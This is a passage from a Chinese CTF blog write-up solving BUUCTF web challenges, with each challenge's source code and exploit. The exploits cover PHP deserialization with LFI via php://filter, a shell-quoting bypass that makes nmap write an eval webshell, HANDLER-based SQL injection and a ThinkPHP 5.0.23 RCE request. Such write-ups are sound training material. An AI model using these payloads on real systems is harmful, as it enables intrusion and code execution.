class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class</span><br></pre></td></tr></table></figure><p>读取后得到flag：</p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200902011024719.png" alt="读取flag"></p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>打开题目，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的反序列题+LFI，关键就在于<code>is_valid</code>函数的绕过。</p><p>此函数限制了payload对应的ascii码区间范围。</p><p>若我们直接正常的使用如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">    <span class="comment">//由于不知道flag的绝对路径，故无法直接读取flag，使用LFI读取即可</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>会发现payload中有不可见字符%00，该字符的ascii值是0，会被<code>is_valid</code>拦截。</p><h3 id="法一：php7-1-版本对属性类型不敏感"><a href="#法一：php7-1-版本对属性类型不敏感" class="headerlink" title="法一：php7.1+版本对属性类型不敏感"></a>法一：php7.1+版本对属性类型不敏感</h3><p>直接修改为public属性，EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">    <span class="comment">//由于不知道flag的绝对路径，故无法直接读取flag，使用LFI读取即可</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="法二：使用16进制绕过"><a href="#法二：使用16进制绕过" class="headerlink" title="法二：使用16进制绕过"></a>法二：使用16进制绕过</h3><p>对于%00出现的属性，只需要将变量名前的小写的<code>s</code>改成大写的<code>S</code>，即可将变量名用16进制表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如：s:11:&#39;%00*%00filename&#39;;</span><br><span class="line">表示为：S:11:&#39;\x00*\x00filename&#39;;</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>打开题目得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令执行题，本题关键是得绕过<code>escapeshellarg</code>与<code>escapeshellcmd</code>。</p><p>关键点再与此处连续套用了转义函数，导致出现了由此产生的bypass绕过方法。</p><p>对于<code>$host=a&#39;b</code>来说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg转义后为：&#39;a\&#39;&#39;&#39;b&#39;</span><br><span class="line">而后经escapeshellcmd转义后为: &#39;a\\&#39;&#39;&#39;b&#39;</span><br><span class="line">如此以来片会造成引号的逃离</span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG evil.php &#39;</span><br></pre></td></tr></table></figure><p>Nmap中<code>-oG</code>参数也将输出结果写入文件，我们利用此来写入一个webshell。</p><p>然后用蚁剑等webshell管理工具连接读取flag即可。</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>强网杯随便注魔改题。</p><p>考点：handler代替select查询。</p><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> <span class="keyword">users</span> <span class="keyword">open</span> <span class="keyword">as</span> yunensec; <span class="comment">#指定数据表进行载入并将返回句柄重命名</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">first</span>; <span class="comment">#读取指定表/句柄的首行数据</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">close</span>; <span class="comment">#关闭句柄</span></span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;FlagHere&#96; open as yunensec;handler yunensec read first;#</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>打开题目，发现页面存在Powered by THINKPHP5的提示。</p><p>随便访问一个控制器：<code>/index.php?s=/index/aaaa</code>，在debug页得到tp版本为5.0.23。</p><p>Google一下tp5.0.23的漏洞，发现RCE一枚。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br></pre></td></tr></table></figure><p>摘自：<a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p><p><img src="https://img.0x002.com/article/BuuCTF3/image-20200903140625859.png" alt="读取flag"></p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>题目给出Hint：<code>flag is in ./flag.txt</code>。</p><p>打开题目给出源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"></span><br><span class="line">reload(sys) </span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>) </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>) </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span> </span><br><span class="line">        self.action = action </span><br><span class="line">        self.param = param </span><br><span class="line">        self.sign = sign </span><br><span class="line">        self.sandbox = md5(ip) </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)): </span><br><span class="line">            <span class="comment">#SandBox For Remote_Addr </span></span><br><span class="line">            os.mkdir(self.sandbox) </span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span> </span><br><span class="line">        result = &#123;&#125; </span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()): </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action: </span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">                resp = scan(self.param) </span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>): </span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp </span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    <span class="built_in">print</span> resp tmpfile.write(resp) </span><br><span class="line">                    </span><br><span class="line">                tmpfile.close() </span><br><span class="line">                </span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> </span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action: </span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span> </span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read() </span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>: </span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> </span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span> </span><br><span class="line">                    result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span> </span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">return</span> result </span><br><span class="line">                </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span> </span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan. </span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span> </span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) </span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> getSign(action, param) </span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span> </span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>)) </span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) </span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>)) </span><br><span class="line">    ip = request.remote_addr </span><br><span class="line">    <span class="keyword">if</span>(waf(param)): </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span> </span><br><span class="line">    task = Task(action, param, sign, ip) </span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec()) </span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read() </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span> </span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>) </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>] </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span> </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest() </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span> </span><br><span class="line">    check=param.strip().lower() </span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>): </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.debug = <span class="literal">False</span> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>考点：MD5长度拓展攻击、local_file协议。</p><p>利用长度拓展攻击绕过sign的验证，再利用<code>local_file</code>协议读取文件内容(<code>file</code>协议为封装好的<code>local_file</code>协议)即可，不过直接不填写任何协议直接让<code>param</code>为<code>flag.txt</code>也可以，因为如果不写协议名称默认即为<code>file</code>协议。</p><p>由于篇幅限制，这里不进行对hash长度拓展攻击的解读。</p><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" 